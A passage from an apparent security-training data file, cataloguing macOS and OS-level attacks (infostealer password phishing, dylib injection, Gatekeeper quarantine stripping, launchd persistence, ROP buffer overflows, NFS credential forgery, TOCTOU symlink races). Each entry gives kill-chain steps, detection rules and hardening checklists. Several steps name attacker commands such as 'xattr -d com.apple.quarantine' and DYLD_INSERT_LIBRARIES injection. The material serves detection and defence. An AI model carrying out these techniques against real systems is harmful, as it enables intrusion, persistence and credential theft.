        desc: "The user opens the disk image and executes the enclosed Mach-O binary or obfuscated shell script."
      },
      {
        step: 3,
        title: "AppleScript Administrative Credential Phish",
        mitre: "T1059.002",
        desc: "Invoking osascript to display a high-fidelity native system dialog prompting the victim for their macOS account password."
      },
      {
        step: 4,
        title: "macOS Keychain & Browser Datastore Scraping",
        mitre: "T1555.001",
        desc: "Unlocking and harvesting login.keychain-db, cookies, saved passwords, Telegram sessions, and crypto wallet extensions."
      },
      {
        step: 5,
        title: "Archive Compression & Staging in /tmp",
        mitre: "T1560.001",
        desc: "Compressing all harvested credential databases and developer SSH keys into a password-protected zip file in /tmp or /Users/Shared."
      },
      {
        step: 6,
        title: "Outbound C2 Exfiltration & Self-Deletion",
        mitre: "T1041",
        desc: "Exfiltrating the archive over HTTPS POST to remote adversary C2 servers and immediately wiping local temporary dropper files."
      }
    ],
    telemetry: {
      sources: [
        "Apple Endpoint Security Framework (ES_EVENT_TYPE_NOTIFY_EXEC with osascript executing display dialog)",
        "macOS Unified Logging (Subsystems: com.apple.securityd, com.apple.launchservices)",
        "Network Egress Logs (HTTPS outbound POST to untrusted foreign IP/domain)",
        "File System Monitoring (Mass file reads in ~/Library/Keychains and ~/Library/Application Support)"
      ],
      anomalies: [
        "Unsigned binary or script executing osascript with 'with hidden answer' password prompts",
        "Non-Apple process accessing multiple browser SQLite databases and ~/Library/Keychains simultaneously",
        "Outbound encrypted HTTPS traffic to dynamic IP addresses with zero domain reputation"
      ]
    },
    rules: {
      sigma: `title: Suspicious AppleScript Password Prompt Dialog (macOS Stealer)
id: 3c9a6f7e-08f3-4a67-8d96-3ac86a070076
status: stable
description: Detects osascript being used to display deceptive system password prompts characteristic of AMOS and macOS stealers.
author: SOC Detection Engineering
logsource:
    product: macos
    category: process_creation
detection:
    selection_exe:
        Image|endswith: '/osascript'
    selection_cmd:
        CommandLine|contains|all:
            - 'display dialog'
            - 'password'
            - 'with hidden answer'
    condition: selection_exe and selection_cmd
fields:
    - ParentImage
    - Image
    - CommandLine
    - User
level: critical
tags:
    - attack.credential_access
    - attack.t1059.002
    - attack.execution`,
      splunk: `index=macos_endpoint Image="*osascript*" CommandLine="*display dialog*password*with hidden answer*"
| eval Alert="CRITICAL: Fake Password Prompt Dialog Detected (Active macOS Infostealer Activity)"
| table _time, host, ParentImage, CommandLine, User, Alert`,
      suricata: `alert tcp $HOME_NET any -> $EXTERNAL_NET 443 (
    msg:"SEC-ALERT Outbound macOS Infostealer Archive Exfiltration";
    flow:to_server,established;
    content:"POST"; http_method;
    content:"/api/upload"; nocase;
    classtype:trojan-activity;
    sid:1000076;
    rev:1;
)`,
      sysmon: `# Check recently opened disk images and quarantine attributes:
xattr -l ~/Downloads/*.dmg 2>/dev/null`
    },
    defenseChecklist: [
      { id: "macmal_1", title: "Enforce Gatekeeper & App Notarization", tier: "OS Security", desc: "Configure macOS Gatekeeper to enforce 'App Store and identified developers' and block execution of unnotarized binaries." },
      { id: "macmal_2", title: "Deploy Endpoint Detection & Response (EDR)", tier: "Endpoint Protection", desc: "Deploy Apple Endpoint Security (ESF) powered EDR (Jamf Protect, CrowdStrike, SentinelOne) with behavioral block rules." },
      { id: "macmal_3", title: "Educate Users on System Password Prompts", tier: "Security Awareness", desc: "Train enterprise users never to input system credentials into popup dialogs spawned by third-party applications." },
      { id: "macmal_4", title: "Hardware-Backed Security Keys (FIDO2)", tier: "Identity Protection", desc: "Implement hardware security keys (YubiKey) for SSO and multi-factor authentication to neutralize stolen passwords." }
    ]
  },

  {
    num: 77,
    id: "macos-code-injection",
    name: "macOS Code Injection (DYLD_INSERT_LIBRARIES & Insecure RPATH Dylib Hijacking)",
    shortName: "macOS Code Injection",
    moduleGroup: "macos",
    module: "Module 6: macOS Security Attacks",
    category: "macos",
    severity: "high",
    cvss: "8.4",
    mitre: "T1055.001, T1055.002, T1574.001",
    primaryTargets: "macOS Applications lacking Hardened Runtime, Dynamic Linker (dyld), @rpath Shared Libraries",
    threatActors: "APT29, Lazarus Group, OceanLotus, Mac Red Teams",
    summary: "macOS Code Injection encompasses techniques used by adversaries to execute arbitrary compiled code inside the address space of trusted, legitimate macOS processes. Common attack methods include using the DYLD_INSERT_LIBRARIES environment variable against binaries that lack the Hardened Runtime or Library Validation entitlements, or hijacking insecure relative runtime search paths (@rpath) to drop and execute malicious dynamic libraries (.dylib) when trusted applications launch.",
    killChain: [
      {
        step: 1,
        title: "Target Application Hardened Runtime Audit",
        mitre: "T1057",
        desc: "Inspecting target macOS application binaries with codesign -d --entitlements to locate applications compiled without Hardened Runtime flags."
      },
      {
        step: 2,
        title: "Insecure @rpath Dependency Enumeration",
        mitre: "T1574.001",
        desc: "Analyzing Mach-O headers using otool -l and otool -L to identify dynamic libraries loaded from writable paths."
      },
      {
        step: 3,
        title: "Malicious Dylib Crafting with Constructor Function",
        mitre: "T1587.001",
        desc: "Compiling a dynamic library in Objective-C/C containing a __attribute__((constructor)) function executing shellcode upon library load."
      },
      {
        step: 4,
        title: "Linker Environment Injection or File Planting",
        mitre: "T1055.001",
        desc: "Setting DYLD_INSERT_LIBRARIES=/path/to/payload.dylib or planting the file into a writable @rpath folder."
      },
      {
        step: 5,
        title: "Process Launch & Automatic Dylib Constructor Execution",
        mitre: "T1055",
        desc: "Launching the target trusted application; dyld automatically maps the malicious library and executes the payload inside the trusted process."
      },
      {
        step: 6,
        title: "Inheritance of App Entitlements & Stealth C2",
        mitre: "T1562.001",
        desc: "Bypassing TCC and outbound firewall prompts by piggybacking on the legitimate application's entitlements and network permissions."
      }
    ],
    telemetry: {
      sources: [
        "Apple Endpoint Security Framework (ES_EVENT_TYPE_NOTIFY_EXEC tracking env vars containing DYLD_*)",
        "macOS dyld logging (Unified Logging with subsystem com.apple.dyld)",
        "Process Memory Tracking (Monitoring mmap with PROT_EXEC on non-standard dylibs)",
        "System Log / Crash Reports (/Library/Logs/DiagnosticReports)"
      ],
      anomalies: [
        "Execution of processes with DYLD_INSERT_LIBRARIES or DYLD_LIBRARY_PATH defined in environment variables",
        "Loading of .dylib files located in world-writable directories (/tmp, /Users/Shared, /var/tmp)",
        "Application crash reports citing code signature verification failures during dyld loading"
      ]
    },
    rules: {
      sigma: `title: macOS Dynamic Library Injection via DYLD Environment Variable
id: 4d8e7a2b-19f4-4b78-9e07-4bf97b180077
status: stable
description: Detects process execution on macOS where DYLD_INSERT_LIBRARIES is present, indicating dylib injection.
author: SOC Detection Engineering
logsource:
    product: macos
    category: process_creation
detection:
    selection:
        CommandLine|contains:
            - 'DYLD_INSERT_LIBRARIES='
            - 'DYLD_LIBRARY_PATH='
    condition: selection
fields:
    - Image
    - CommandLine
    - User
level: high
tags:
    - attack.defense_evasion
    - attack.t1055.001`,
      splunk: `index=macos_endpoint (CommandLine="*DYLD_INSERT_LIBRARIES=*" OR CommandLine="*DYLD_LIBRARY_PATH=*")
| eval Alert="HIGH: Dynamic Library Injection Attempt (DYLD Abuse)"
| table _time, host, Image, CommandLine, User, Alert`,
      suricata: `# Network correlation:
alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (
    msg:"SEC-ALERT Suspicious dylib Download from Internet";
    flow:to_client,established;
    content:".dylib"; nocase;
    classtype:bad-unknown;
    sid:1000077;
    rev:1;
)`,
      sysmon: `# Inspect binary entitlements and Hardened Runtime status on macOS:
codesign -dv --entitlements - /Applications/TargetApp.app 2>&1`
    },
    defenseChecklist: [
      { id: "macinj_1", title: "Enable Hardened Runtime on All Binaries", tier: "Build Pipeline", desc: "Compile all native macOS binaries with the '--options runtime' flag to restrict dynamic linker environment variables." },
      { id: "macinj_2", title: "Enforce Library Validation Entitlement", tier: "Application Security", desc: "Enable Library Validation so that the operating system refuses to load dynamic libraries not signed by Apple or the same Team ID." },
      { id: "macinj_3", title: "Audit & Eliminate Insecure @rpath Definitions", tier: "Code Quality", desc: "Audit Mach-O binary search paths to ensure all @rpath definitions point strictly to read-only application bundle frameworks." },
      { id: "macinj_4", title: "Deploy EDR with DYLD Environment Monitoring", tier: "Detection", desc: "Ensure endpoint protection monitors and blocks any application launch exhibiting DYLD_INSERT_LIBRARIES." }
    ]
  },

  {
    num: 78,
    id: "gatekeeper-bypass",
    name: "macOS Gatekeeper Bypass (File Quarantine Stripping & Archive Extraction Logic Flaws)",
    shortName: "Gatekeeper Bypass",
    moduleGroup: "macos",
    module: "Module 6: macOS Security Attacks",
    category: "macos",
    severity: "high",
    cvss: "8.2",
    mitre: "T1553.001, T1562.001, T1204.002",
    primaryTargets: "Apple Gatekeeper Subsystem, com.apple.quarantine Extended Attribute, Archive Utility, syspolicyd",
    threatActors: "Lazarus Group, Shlayer, OceanLotus, CloudMensis",
    summary: "Gatekeeper Bypass attacks allow threat actors to execute unsigned, unnotarized, or malicious code on macOS without triggering the standard security prompt: '[App] cannot be opened because it is from an unidentified developer'. Adversaries achieve this by exploiting logic bugs in macOS archive decompression tools (e.g. tar/gzip handling that omits quarantine flags), abusing symlinks in disk images, utilizing untracked file formats, or programmatically stripping the 'com.apple.quarantine' extended attribute using the xattr command.",
    killChain: [
      {
        step: 1,
        title: "Gatekeeper Architecture & Policy Footprinting",
        mitre: "T1082",
        desc: "Auditing Gatekeeper assessment rules and testing how syspolicyd processes various container formats."
      },
      {
        step: 2,
        title: "Evasive Container Construction",
        mitre: "T1553.001",
        desc: "Packaging malicious payloads into specific archive formats (crafted ZIP, tar, or DMG with nested symlinks) designed to evade quarantine propagation."
      },
      {
        step: 3,
        title: "Malicious Attachment Delivery via Browser",
        mitre: "T1566.001",
        desc: "Delivering the archive to the victim through Safari or third-party web browsers, triggering download."
      },
      {
        step: 4,
        title: "Quarantine Attribute Stripping / Non-Propagation",
        mitre: "T1562.001",
        desc: "Upon extraction, the enclosed executable lacks the com.apple.quarantine extended attribute due to archive handling flaws."
      },
      {
        step: 5,
        title: "Launch Services Execution Without Gatekeeper Block",
        mitre: "T1204.002",
        desc: "Double-clicking or invoking the extracted binary launches directly without the security prompt or notarization check."
      },
      {
        step: 6,
        title: "Unrestricted Payload Execution & Ingress",
        mitre: "T1059.004",
        desc: "The payload initiates background beaconing, bypassing initial security defenses completely."
      }
    ],
    telemetry: {
      sources: [
        "macOS Unified Logging (Subsystems: com.apple.syspolicy, com.apple.LaunchServices)",
        "Apple Endpoint Security Framework (ES_EVENT_TYPE_NOTIFY_SETXATTR and ES_EVENT_TYPE_NOTIFY_DELETEEXTATTR)",
        "Syslog (/var/log/system.log)",
        "EDR telemetry capturing execution of binaries downloaded from internet lacking quarantine tags"
      ],
      anomalies: [
        "Execution of 'xattr -d com.apple.quarantine' or 'xattr -c' against newly downloaded files",
        "Newly dropped Mach-O binary executed from ~/Downloads with no preceding syspolicyd evaluation",
        "Archive utility spawning processes with non-standard file extraction flags"
      ]
    },
    rules: {
      sigma: `title: Removal of macOS Quarantine Extended Attribute
id: 5e9f8b3a-20a5-4c89-9f18-5ca08c290078
status: stable
description: Detects command-line execution of xattr stripping the com.apple.quarantine attribute to bypass Gatekeeper.
author: SOC Detection Engineering
logsource:
    product: macos
    category: process_creation
detection:
    selection:
        CommandLine|contains|all:
            - 'xattr'
            - 'com.apple.quarantine'
        CommandLine|contains:
            - ' -d '
            - ' -r -d '
            - ' -c '
    condition: selection
fields:
    - Image
    - CommandLine
    - User
level: high
tags:
    - attack.defense_evasion
    - attack.t1562.001
    - attack.t1553.001`,
      splunk: `index=macos_endpoint Image="*xattr*" (CommandLine="*-d*com.apple.quarantine*" OR CommandLine="*-c*")
| eval Alert="HIGH: Gatekeeper Bypass Attempt - Quarantine Extended Attribute Removed"
| table _time, host, Image, CommandLine, User, Alert`,
      suricata: `alert tcp $EXTERNAL_NET any -> $HOME_NET any (
    msg:"SEC-ALERT Inbound Archive Payload Designed to Bypass Gatekeeper";
    flow:to_client,established;
    content:"xattr"; content:"com.apple.quarantine";
    classtype:bad-unknown;
    sid:1000078;
    rev:1;
)`,
      sysmon: `# Inspect extended attributes on downloaded files:
xattr -p com.apple.quarantine ~/Downloads/* 2>/dev/null`
    },
    defenseChecklist: [
      { id: "gate_1", title: "Keep macOS Updated (Rapid Security Responses)", tier: "Patching", desc: "Promptly install macOS updates and Rapid Security Responses (RSR) to patch archive parsing and Gatekeeper logic flaws." },
      { id: "gate_2", title: "Enforce Gatekeeper via MDM Configuration", tier: "Policy Enforcement", desc: "Deploy configuration profiles enforcing 'spctl --master-enable' and disallowing user override of unsigned applications." },
      { id: "gate_3", title: "Monitor xattr Commands via EDR", tier: "Detection Engineering", desc: "Create behavioral alerts and blocking rules on any process executing 'xattr -d com.apple.quarantine'." },
      { id: "gate_4", title: "Enforce Safari Download Quarantining", tier: "Browser Hardening", desc: "Ensure web browsers and communication apps properly apply com.apple.quarantine extended attributes to all downloaded files." }
    ]
  },

  {
    num: 79,
    id: "launch-agent-daemon-abuse",
    name: "macOS Launch Agent & Launch Daemon Abuse (launchd Property List Persistence)",
    shortName: "Launch Agent/Daemon Abuse",
    moduleGroup: "macos",
    module: "Module 6: macOS Security Attacks",
    category: "macos",
    severity: "high",
    cvss: "8.5",
    mitre: "T1543.001, T1543.004, T1547",
    primaryTargets: "launchd (PID 1), ~/Library/LaunchAgents, /Library/LaunchDaemons, Property List (.plist) Files",
    threatActors: "APT32 (OceanLotus), MacStealer, Lazarus Group, Silver Sparrow",
    summary: "Launch Agent and Daemon Abuse is the primary persistence mechanism utilized by adversaries on macOS. Attackers write a malicious Property List (.plist) configuration file into ~/Library/LaunchAgents (for user-level persistence) or /Library/LaunchDaemons (for root-level persistence). The central macOS service manager (launchd) parses these configuration files and automatically launches the referenced malicious binary or script upon user login or system startup, configuring KeepAlive directives to restart the malware if terminated.",
    killChain: [
      {
        step: 1,
        title: "Target Persistence Directory Selection",
        mitre: "T1543.001",
        desc: "Selecting persistence scope: ~/Library/LaunchAgents (user-level, no password needed) or /Library/LaunchDaemons (system-wide, requires root)."
      },
      {
        step: 2,
        title: "Malicious Binary / Script Staging",
        mitre: "T1105",
        desc: "Dropping the background backdoor payload into a hidden directory (e.g. ~/Library/Application Support/.system_update)."
      },
      {
        step: 3,
        title: "Crafting Launchd Property List (.plist)",
        mitre: "T1543.001",
        desc: "Creating a .plist file with RunAtLoad=true, KeepAlive=true, and ProgramArguments pointing to the malicious payload."
      },
      {
        step: 4,
        title: "Placement into Launch Directory",
        mitre: "T1543.004",
        desc: "Writing the plist file into the target launch folder with strict permissions (chmod 644)."
      },
      {
        step: 5,
        title: "Service Registration via launchctl",
        mitre: "T1543",
        desc: "Executing launchctl load -w or launchctl bootstrap to register the service immediately with the launchd daemon."
      },
      {
        step: 6,
        title: "Persistent Automated Execution & Recovery",
        mitre: "T1059",
        desc: "launchd launches the malware automatically on reboot or user login and restarts the process automatically if killed."
      }
    ],
    telemetry: {
      sources: [
        "Apple Endpoint Security Framework (ES_EVENT_TYPE_NOTIFY_CREATE / ES_EVENT_TYPE_NOTIFY_WRITE in LaunchAgents or LaunchDaemons)",
        "macOS Unified Logging (Subsystem com.apple.launchd)",
        "macOS Background Task Management (BTM alerts)",
        "Process Creation Logs (launchd spawning unexpected binaries in user directories)"
      ],
      anomalies: [
        "New .plist file created in ~/Library/LaunchAgents pointing to binaries in /tmp, /Users/Shared, or hidden dot-folders",
        "launchd spawning interactive shells (bash, zsh, python) with KeepAlive directives",
        "Frequent execution of 'launchctl load' or 'launchctl bootstrap' from non-installer processes"
      ]
    },
    rules: {
      sigma: `title: Suspicious macOS Launch Agent or Daemon Creation
id: 6f0a9c4b-31b6-4d90-8e29-6db19d300079
status: stable
description: Detects the creation of a LaunchAgent or LaunchDaemon plist pointing to suspicious execution paths.
author: SOC Detection Engineering
logsource:
    product: macos
    category: file_event
detection:
    selection_path:
        TargetFilename|contains:
            - '/Library/LaunchAgents/'
            - '/Library/LaunchDaemons/'
    selection_target:
        CommandLine|contains:
            - '/tmp/'
            - '/Users/Shared/'
            - '/. '
            - 'curl '
            - 'sh -c'
    condition: selection_path or selection_target
fields:
    - TargetFilename
    - Image
    - User
level: high
tags:
    - attack.persistence
    - attack.t1543.001
    - attack.t1543.004`,
      splunk: `index=macos_file (FilePath="*/Library/LaunchAgents/*" OR FilePath="*/Library/LaunchDaemons/*") (FilePath="*.plist")
| eval Alert="HIGH: New macOS Persistence Item (LaunchAgent/Daemon) Created"
| table _time, host, ProcessName, FilePath, User, Alert`,
      suricata: `# Network signature:
alert tcp $EXTERNAL_NET any -> $HOME_NET any (
    msg:"SEC-ALERT Inbound Property List Payload with RunAtLoad Directives";
    flow:to_server,established;
    content:"RunAtLoad"; content:"ProgramArguments";
    classtype:bad-unknown;
    sid:1000079;
    rev:1;
)`,
      sysmon: `# List all installed LaunchAgents and LaunchDaemons for current user:
launchctl list | head -n 25`
    },
    defenseChecklist: [
      { id: "launch_1", title: "Enable macOS Background Task Management (BTM)", tier: "Native OS", desc: "Leverage macOS Ventura/Sonoma Background Task Management notifications alerting users when login items are added." },
      { id: "launch_2", title: "Lock Down /Library/LaunchDaemons Directory", tier: "Permissions", desc: "Ensure root ownership and strict 755/644 permissions on /Library/LaunchDaemons to prevent non-root write access." },
      { id: "launch_3", title: "Deploy File Integrity Monitoring on Launch Folders", tier: "FIM Monitoring", desc: "Monitor ~/Library/LaunchAgents, /Library/LaunchAgents, and /Library/LaunchDaemons with EDR to alert on newly written plists." },
      { id: "launch_4", title: "Enforce Code Signing Verification on Launch Binaries", tier: "Application Control", desc: "Prohibit launchd from executing binaries that are not signed by approved developer Team IDs." }
    ]
  },

  // =========================================================================
  // MODULE 6: OPERATING SYSTEM SECURITY - OS SPECIALIZED ATTACKS (80 - 83)
  // =========================================================================
  {
    num: 80,
    id: "specialized-buffer-overflow",
    name: "OS Specialized Buffer Overflow (Low-Level Binary Exploitation & ROP Chain Execution)",
    shortName: "Specialized Buffer Overflow",
    moduleGroup: "os-spec",
    module: "Module 6: OS Specialized Attacks",
    category: "os-spec",
    severity: "critical",
    cvss: "9.8",
    mitre: "T1203, T1059, T1068",
    primaryTargets: "Native C/C++ Binaries, Stack Frames ($EIP/$RIP), Instruction Pointer Registers, glibc, MSVCRT",
    threatActors: "Nation-State APTs, 0-Day Exploit Developers, Vulnerability Researchers",
    summary: "OS Specialized Buffer Overflow is an advanced low-level binary exploitation attack targeting native compiled applications (C/C++). By submitting input that exceeds the allocated memory bounds of a buffer on the stack or heap, an attacker overwrites adjacent control dataâ€”specifically the saved frame pointer ($EBP/$RBP) and the saved instruction pointer ($EIP/$RIP). Attackers chain Return-Oriented Programming (ROP) gadgets to bypass modern OS mitigations (ASLR, DEP/NX, Stack Canaries) and redirect execution control flow to execute arbitrary code.",
    killChain: [
      {
        step: 1,
        title: "Target Binary Boundary Fuzzing",
        mitre: "T1595.002",
        desc: "Fuzzing target binary inputs with cyclical byte patterns to induce memory segmentation faults (SIGSEGV) and measure crash offsets."
      },
      {
        step: 2,
        title: "Offset Calculation & Instruction Pointer Control",
        mitre: "T1203",
        desc: "Calculating the exact byte offset required to overwrite the saved return address register ($EIP or $RIP) in the stack frame."
      },
      {
        step: 3,
        title: "Exploit Mitigation Audit (checksec)",
        mitre: "T1082",
        desc: "Auditing binary and OS protections (DEP/NX, ASLR, Stack Canaries, PIE, RELRO) to determine the required bypass strategy."
      },
      {
        step: 4,
        title: "Return-Oriented Programming (ROP) Gadget Assembly",
        mitre: "T1203",
        desc: "Extracting assembly instruction snippets ending in 'ret' from loaded libraries to build a ROP chain calling mprotect() or VirtualProtect()."
      },
      {
        step: 5,
        title: "Memory Permission Subversion & Payload Injection",
        mitre: "T1055",
        desc: "Executing the ROP chain to make the stack or heap memory executable (PAGE_EXECUTE_READWRITE) and jumping to shellcode."
      },
      {
        step: 6,
        title: "Shellcode Detonation & Privilege Takeover",
        mitre: "T1059.004",
        desc: "The injected shellcode executes setuid(0) and invokes execve('/bin/sh', ...) spawning an elevated command shell."
      }
    ],
    telemetry: {
      sources: [
        "Linux dmesg / Kernel Log (segfault at ... ip ... sp ... error 4 in libc.so)",
        "Windows Application Event Log (Event ID 1000 Application Error, Exception Code 0xc0000005 Access Violation)",
        "Core Dumps (/var/lib/systemd/coredump or Windows WER crash dumps)",
        "EDR Exploit Detection Telemetry (ROP detection, stack pivot heuristics)"
      ],
      anomalies: [
        "Application crash followed by immediate child process spawning of cmd.exe, sh, or bash",
        "Stack pointer ($ESP/$RSP) pointing outside valid thread stack memory boundaries (stack pivoting)",
        "Frequent segmentation fault crashes for a specific network daemon within seconds"
      ]
    },
    rules: {
      sigma: `title: Application Crash Followed by Process Spawning (Exploitation)
id: 7a1b0d5c-42c7-4e01-9f30-7ec20a410080
status: stable
description: Detects an application crash event immediately followed by the creation of an unexpected command interpreter.
author: SOC Detection Engineering
logsource:
    product: linux
    service: syslog
detection:
    selection_crash:
        message|contains:
            - 'segfault at'
            - 'general protection fault'
    condition: selection_crash
fields:
    - process
    - ip
    - sp
level: high
tags:
    - attack.execution
    - attack.t1203`,
      splunk: `index=os_logs ("segfault at" OR "EventCode=1000" OR "0xc0000005")
| stats count by host, process_name
| where count > 2
| eval Alert="CRITICAL: Potential Memory Corruption / Buffer Overflow Exploitation Crash"
| table _time, host, process_name, count, Alert`,
      suricata: `alert tcp $EXTERNAL_NET any -> $HOME_NET any (
    msg:"SEC-ALERT Long NOP Sled Followed by Shellcode Pattern";
    flow:to_server,established;
    content:"|90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90|";
    classtype:shellcode-detect;
    sid:1000080;
    rev:1;
)`,
      sysmon: `# Inspect binary compilation flags with checksec:
checksec --file=/usr/bin/target_binary 2>/dev/null`
    },
    defenseChecklist: [
      { id: "bof_1", title: "Compile with Modern Exploit Mitigations", tier: "Software Development", desc: "Enforce compiler flags: -fstack-protector-strong, -D_FORTIFY_SOURCE=2, -Wl,-z,relro,-z,now (Full RELRO), and -fPIE." },
      { id: "bof_2", title: "Enforce Address Space Layout Randomization (ASLR)", tier: "OS Hardening", desc: "Ensure kernel ASLR is fully enabled across the estate (sysctl -w kernel.randomize_va_space=2)." },
      { id: "bof_3", title: "Hardware-Enforced Data Execution Prevention (DEP/NX)", tier: "Hardware Architecture", desc: "Enforce the NX (No-Execute) bit to prevent code execution from the stack and data memory heaps." },
      { id: "bof_4", title: "Migrate Codebases to Memory-Safe Languages", tier: "Architecture", desc: "Transition critical low-level service software from C/C++ to memory-safe languages such as Rust or Go." }
    ]
  },

  {
    num: 81,
    id: "specialized-nfs-attack",
    name: "OS Specialized NFS Attack (RPC Protocol Manipulation & Raw File Handle Forgery)",
    shortName: "Specialized NFS Attack",
    moduleGroup: "os-spec",
    module: "Module 6: OS Specialized Attacks",
    category: "os-spec",
    severity: "high",
    cvss: "8.6",
    mitre: "T1021.002, T1078, T1212",
    primaryTargets: "Network File System (NFSv3/NFSv4), RPC XDR Encoding, 32/64-Bit File Handles, Storage Arrays",
    threatActors: "Advanced Persistent Threats, Storage Infrastructure Attackers",
    summary: "The OS Specialized NFS Attack targets low-level protocol flaws in Network File System implementations. Rather than relying on OS mount tools, attackers construct raw Remote Procedure Call (RPC) packets with custom External Data Representation (XDR) payloads directly. By exploiting predictable NFS file handle generation algorithms, spoofing AUTH_UNIX credentials (forging arbitrary UID/GID arrays), and manipulating stateless RPC transactions, attackers bypass client-side mount restrictions and directly manipulate remote filesystem blocks.",
    killChain: [
      {
        step: 1,
        title: "Low-Level RPC Portmapper Interrogation",
        mitre: "T1595.002",
        desc: "Querying RPC program 100003 (nfs) and 100005 (mountd) across network sockets to fingerprint RPC protocol versions."
      },
      {
        step: 2,
        title: "Direct RPC MOUNT Call & Root Handle Probing",
        mitre: "T1021.002",
        desc: "Dispatching raw XDR-encoded MOUNTPROC3_MNT packets requesting directory file handles without standard client OS validation."
      },
      {
        step: 3,
        title: "File Handle Analysis & Predictability Prediction",
        mitre: "T1212",
        desc: "Analyzing returned 32-byte or 64-byte opaque file handles to deduce internal inode structures and filesystem generation counters."
      },
      {
        step: 4,
        title: "AUTH_UNIX Credential Header Forgery",
        mitre: "T1078",
        desc: "Crafting custom RPC headers containing AUTH_UNIX credentials with UID 0 (root) and GID 0 in the client security credential field."
      },
      {
        step: 5,
        title: "Raw NFS LOOKUP, READ & WRITE Injection",
        mitre: "T1021.002",
        desc: "Injecting raw NFSPROC3_WRITE transactions directly targeting critical system files (/etc/shadow, authorized_keys) on the storage array."
      },
      {
        step: 6,
        title: "Arbitrary File Corruption & Host Takeover",
        mitre: "T1565.001",
        desc: "Overwriting administrative access credentials, enabling immediate root login across all servers sharing the NFS volume."
      }
    ],
    telemetry: {
      sources: [
        "Network IDS / Zeek (rpc.log detecting anomalous RPC transactions without preceding MOUNT negotiation)",
        "NFS Server Syslog (kernel: nfsd: unexpected client source port, rpc.mountd denials)",
        "Network Flow (Surge in raw XDR packets on TCP/UDP port 2049 from non-whitelisted IPs)",
        "Storage Array Audit Logs (Direct file write transactions with forged AUTH_UNIX headers)"
      ],
      anomalies: [
        "NFS WRITE operations originating from source TCP ports >= 1024 when the 'secure' export option mandates ports < 1024",
        "RPC calls carrying AUTH_UNIX headers with UID=0 originating from non-management IP addresses",
        "Direct NFSPROC3_READ or WRITE calls without prior valid MOUNTPROC transactions"
      ]
    },
    rules: {
      sigma: `title: Anomalous RPC NFS Transaction Without Mount Negotiation
id: 8b2c1e6d-53d8-4f12-9a41-8ed31b520081
status: stable
description: Detects raw NFS file read or write RPC transactions occurring without a legitimate prior mount procedure.
author: SOC Detection Engineering
logsource:
    product: zeek
    service: rpc
detection:
    selection_proc:
        operation:
            - 'NFSPROC3_WRITE'
            - 'NFSPROC3_CREATE'
    selection_uid:
        uid: 0
    condition: selection_proc and selection_uid
fields:
    - id.orig_h
    - id.resp_h
    - operation
    - uid
level: high
tags:
    - attack.lateral_movement
    - attack.t1021.002`,
      splunk: `index=network_zeek service="rpc" (operation="NFSPROC3_WRITE" OR operation="NFSPROC3_SETATTR") uid=0
| stats count by id.orig_h, id.resp_h, operation
| where count > 5
| eval Alert="HIGH: Low-Level NFS Protocol Manipulation / Raw UID 0 Write Injection"
| table _time, id.orig_h, id.resp_h, operation, count, Alert`,
      suricata: `alert tcp $EXTERNAL_NET any -> $HOME_NET 2049 (
    msg:"SEC-ALERT Inbound NFS Call with Non-Privileged Source Port";
    flow:to_server,established;
    content:"|00 01 86 A3|";
    threshold: type both, track by_src, count 10, seconds 5;
    classtype:attempted-admin;
    sid:1000081;
    rev:1;
)`,
      sysmon: `# Verify NFS export options in /etc/exports:
cat /etc/exports | grep -v "^#"`
    },
    defenseChecklist: [
      { id: "snfs_1", title: "Enforce RPCSEC_GSS with Kerberos 5", tier: "Protocol Hardening", desc: "Mandate RPCSEC_GSS (sec=krb5p) to require cryptographic authentication and full packet encryption for all NFS traffic." },
      { id: "snfs_2", title: "Require Privileged Source Ports (secure flag)", tier: "Export Policy", desc: "Ensure all exported shares enforce the 'secure' option, rejecting any incoming connection originating from port >= 1024." },
      { id: "snfs_3", title: "Network Boundary Firewalls on Ports 111 & 2049", tier: "Perimeter", desc: "Block TCP and UDP ports 111 (rpcbind) and 2049 (NFS) at perimeter and inter-zone firewalls." },
      { id: "snfs_4", title: "Storage Controller Firmware Hardening", tier: "Infrastructure", desc: "Upgrade storage array operating firmware to ensure file handle generation utilizes cryptographically secure pseudorandom nonces." }
    ]
  },

  {
    num: 82,
    id: "race-condition-attack",
    name: "OS Race Condition Attack (Time-of-Check to Time-of-Use [TOCTOU] & Symlink Swapping)",
    shortName: "Race Condition Attack",
    moduleGroup: "os-spec",
    module: "Module 6: OS Specialized Attacks",
    category: "os-spec",
    severity: "high",
    cvss: "8.1",
    mitre: "T1068, T1574, T1059.004",
    primaryTargets: "Shared Temporary Directories (/tmp, /var/tmp), SUID Binaries, Symlinks, Asynchronous File Handlers",
    threatActors: "Local Privilege Escalation Attackers, Exploit Developers",
    summary: "A Race Condition Attack targets Time-of-Check to Time-of-Use (TOCTOU) concurrency vulnerabilities in operating system file operations. When a privileged root service checks the permissions or existence of a file (check) and subsequently performs an action on it (use) after a time gap, an attacker rapidly alternates a symlink between a harmless file and a sensitive system target (e.g. /etc/passwd or /etc/shadow). If the race is won, the privileged process executes the write on the sensitive target, enabling arbitrary modification.",
    killChain: [
      {
        step: 1,
        title: "Asynchronous File Handler Identification",
        mitre: "T1057",
        desc: "Auditing SUID binaries and background root cron jobs to identify non-atomic file operations in shared folders like /tmp."
      },
      {
        step: 2,
        title: "TOCTOU Execution Window Measurement",
        mitre: "T1068",
        desc: "Measuring the time interval between the initial permission check (access() or stat()) and the subsequent file write (open() or write())."
      },
      {
        step: 3,
        title: "High-Frequency Symlink Swapping Loop",
        mitre: "T1574",
        desc: "Spawning multithreaded exploit processes continuously alternating a symlink between a temporary scratch file and /etc/shadow."
      },
      {
        step: 4,
        title: "Privileged Execution Triggering",
        mitre: "T1059.004",
        desc: "Triggering the privileged binary or service in parallel to force it to operate on the rapidly shifting symlink path."
      },
      {
        step: 5,
        title: "Race Window Interception & Target Redirection",
        mitre: "T1068",
        desc: "The access check succeeds on the harmless file, but the subsequent root write hits the swapped symlink pointing to /etc/shadow."
      },
      {
        step: 6,
        title: "Arbitrary Root Payload Ingestion & Shell Elevation",
        mitre: "T1136.001",
        desc: "A custom password hash is written into the shadow file, allowing the attacker to su to root with known credentials."
      }
    ],
    telemetry: {
      sources: [
        "Linux auditd Logs (High volume of symlink, unlink, and renameat syscalls in /tmp)",
        "Sysmon for Linux (Event ID 11 FileCreate tracking rapid symlink creation)",
        "Kernel Auditing (fs.protected_symlinks violation warnings in dmesg)",
        "File Integrity Monitoring (AIDE alerts on sudden writes to /etc/shadow or /etc/passwd)"
      ],
      anomalies: [
